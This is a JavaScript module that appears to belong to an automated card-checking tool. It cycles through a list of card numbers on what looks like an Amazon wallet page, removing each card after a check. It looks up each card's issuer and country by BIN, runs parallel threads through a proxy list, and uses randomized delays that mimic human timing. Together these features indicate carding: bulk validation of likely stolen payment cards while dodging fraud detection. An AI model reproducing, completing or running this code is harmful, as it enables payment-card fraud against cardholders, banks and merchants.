async function removeCard(page) {
    const maxRetries = 5;
    
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        console.log(`🗑️ Remove attempt ${attempt}/${maxRetries}`);
        
        try {
            if (!page || page.isClosed()) {
                return {success: false, error: 'PAGE_CLOSED'};
            }

            await new Promise(resolve => setTimeout(resolve, randomInt(1000, 1500)));
            
            // ✅ STEP 1: FIND AND CLICK REMOVE LINK
            const removeLinkClicked = await page.evaluate(() => {
                const selectors = [
                    '.a-row.apx-wallet-payment-method-details-section.pmts-portal-component .a-link-normal',
                    '.apx-wallet-payment-method-details-section a[href*="remove"]',
                    '.pmts-portal-component .a-link-normal',
                    'a:has-text("Remove")',
                    '.apx-remove-link'
                ];
                
                for (const selector of selectors) {
                    const element = document.querySelector(selector);
                    if (element && element.offsetParent !== null) { // Check if visible
                        element.click();
                        return { success: true, selector };
                    }
                }
                
                return { success: false };
            });

            if (!removeLinkClicked.success) {
                console.log(`   ❌ No remove link found, attempt ${attempt}`);
                if (attempt < maxRetries) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    continue;
                } else {
                    return {success: false, reload: true, error: 'NO_REMOVE_LINK'};
                }
            }
            
            console.log(`   ✅ Remove link clicked: ${removeLinkClicked.selector}`);
            await new Promise(resolve => setTimeout(resolve, randomInt(2000, 3000)));

            // ✅ STEP 2: HANDLE REMOVE POPOVER/MODAL
            const removalHandled = await page.evaluate(() => {
                // Strategy 1: Look for "Remove without selecting" option (best case)
                const removeWithoutSelecting = document.querySelector('.a-popover[aria-hidden="false"] .apx-remove-link-button[value="Remove without selecting"]');
                if (removeWithoutSelecting) {
                    removeWithoutSelecting.click();
                    return { success: true, method: 'remove_without_selecting' };
                }

                // Strategy 2: Look for remove button in popover
                const popoverButtons = [
                    '.a-popover[aria-hidden="false"] .apx-remove-link-button',
                    '.a-popover-modal .apx-remove-link-button',
                    '.a-declarative[aria-hidden="false"] .apx-remove-link-button'
                ];
                
                for (const selector of popoverButtons) {
                    const button = document.querySelector(selector);
                    if (button && button.offsetParent !== null) {
                        button.click();
                        return { success: true, method: 'popover_button', selector };
                    }
                }

                // Strategy 3: Look for confirmation buttons
                const confirmButtons = [
                    '.a-popover[aria-hidden="false"] .pmts-delete-instrument input.a-button-input',
                    '.a-popover[aria-hidden="false"] .apx-remove-button-desktop input',
                    '.a-popover-modal input.a-button-input[type="submit"]'
                ];
                
                for (const selector of confirmButtons) {
                    const button = document.querySelector(selector);
                    if (button && button.offsetParent !== null) {
                        button.click();
                        return { success: true, method: 'confirm_button', selector };
                    }
                }
                
                return { success: false };
            });

            if (removalHandled.success) {
                console.log(`   ✅ Card removal handled: ${removalHandled.method}`);
                
                // Wait for removal to complete
                await new Promise(resolve => setTimeout(resolve, randomInt(2000, 4000)));
                
                // ✅ VERIFY REMOVAL WAS SUCCESSFUL
                const verifyRemoval = await page.evaluate(() => {
                    // Check if we're back to wallet or if popover is gone
                    const popoverStillVisible = document.querySelector('.a-popover[aria-hidden="false"]');
                    const walletVisible = document.querySelector('.a-scroller.apx-wallet-desktop-payment-method-selectable-tab-css');
                    
                    return {
                        popoverGone: !popoverStillVisible,
                        walletVisible: !!walletVisible,
                        currentUrl: window.location.href
                    };
                });
                
                if (verifyRemoval.popoverGone || verifyRemoval.walletVisible) {
                    console.log(`   ✅ Removal verified successful`);
                    return {success: true};
                } else {
                    console.log(`   ⚠️ Removal may not have completed, continuing anyway`);
                    return {success: true}; // Assume success
                }
                
            } else {
                console.log(`   ❌ Could not handle removal popover, attempt ${attempt}`);
                if (attempt < maxRetries) {
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    continue;
                }
            }

        } catch (error) {
            console.log(`   ❌ Remove error attempt ${attempt}: ${error.message}`);
            
            if (error.message.includes('detached') || error.message.includes('Session closed')) {
                return {success: false, error: 'FRAME_DETACHED'};
            }
            
            if (attempt < maxRetries) {
                await new Promise(resolve => setTimeout(resolve, 3000));
                continue;
            }
        }
    }
    
    console.log(`❌ Card removal failed after ${maxRetries} attempts`);
    return {success: false, reload: true, error: 'MAX_ATTEMPTS_EXCEEDED'};
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function getCardInfo(cardNumber) {
    try {
        const bin = cardNumber.substring(0, 8);
        const binKey = bin.substring(0, 6);
        
        if (binCache[binKey]) {
            
            return {
                success: true,
                scheme: binCache[binKey].scheme,
                type: binCache[binKey].type,
                cardTier: binCache[binKey].cardTier,
                a2: binCache[binKey].a2,
                country: binCache[binKey].country,
                issuer: binCache[binKey].issuer
            };
        }
        
        let res = (await axios.get(`https://data.handyapi.com/bin/${cardNumber}`)).data;
        
        if (res.Status === "SUCCESS") {
            binCache[binKey] = {
                scheme: res.Scheme,
                type: res.Type,
                cardTier: res.CardTier,
                a2: res.Country.A2,
                country: res.Country.Name,
                issuer: res.Issuer
            };
            
            return {
                success: true,
                ...binCache[binKey]
            };
        }
        
        return { success: false, error: res.Status };
    } catch (error) {
        if (error.message && error.message.includes('redirects exceeded')) {
       
        } else {
           
        }
        
        return { 
            success: false, 
            error: error.message,
            scheme: 'Unknown',
            type: 'Unknown',
            cardTier: 'Unknown',
            a2: 'Unknown',
            country: 'Unknown',
            issuer: 'Unknown'
        };
    }
}

var saveData = setInterval(() => {
    fs.writeFileSync(path.join(__dirname, "..", "data", 'data.json'), JSON.stringify(data, null, 2), 'utf8');
}, 5000);

function saveRemainingCards() {
    const remainingCards = listCards.slice(indexCard + 1);
    
    // ✅ ENSURE global.data.dirSave EXISTS
    if (!global.data.dirSave) {
        global.data.dirSave = path.join(__dirname, "..", "data");
    }
    
    fs.writeFileSync(path.join(global.data.dirSave, 'remaining_cards.txt'), remainingCards.join('\n'), 'utf8');
    
    updateRemainingCardCount();
}

function updateRemainingCardCount() {
    const remaining = Math.max(0, totalCards - (indexCard + 1));
    
    if (console.card && typeof console.card.setRemaining === 'function') {
        console.card.setRemaining(remaining);
    }
    
    return remaining;
}


async function checkCard() {
    !data.childCount ? data.childCount = {} : "";
    !global.temp ? global.temp = {} : "";
    !global.temp.checkCard ? global.temp.checkCard = {} : "";
    
    // ✅ RESET WINDOW POSITIONS AT START
    windowManager.reset();
    
    console.app(`🚀 Starting card check with ${totalCards} cards`);

    if (!listProxy.length) {
        console.app("⚠️ Warning: No proxies found in proxies.txt, running without proxy");
        console.log("⚠️ Warning: No proxies found in proxies.txt, running without proxy");
        initThread(null, 0);
        return;
    }
    
    for (let i in listProxy) {
        let [host, port, user, pass] = listProxy[i].split(':');
        let proxy = {
            host: host,
            port: port,
            user: user,
            pass: pass
        };
        initThread(proxy, i);
    }
}


module.exports = checkCard;
